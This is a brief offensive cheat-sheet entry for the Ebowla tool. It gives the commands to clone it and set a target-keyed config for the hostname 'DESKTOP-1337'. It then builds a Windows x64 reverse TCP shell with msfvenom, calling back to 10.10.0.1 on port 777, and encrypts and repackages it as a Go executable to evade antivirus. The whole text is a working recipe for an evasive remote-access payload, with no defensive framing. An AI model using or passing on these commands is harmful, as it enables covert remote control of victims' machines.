<a href="https://github.com/Genetic-Malware/Ebowla">Ebowla</a>

```bash
git clone https://github.com/Genetic-Malware/Ebowla.git
nano genetic.config:
	output_type = GO
	payload_type = EXE
	username = ''
	computername = 'DESKTOP-1337'
	userdomain = ''

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe -a x64 -o rev.exe
python ebowla.py rev.exe genetic.config
./build_x64_go.sh output/go_symmetric_rev.exe.go rev-enc.exe
```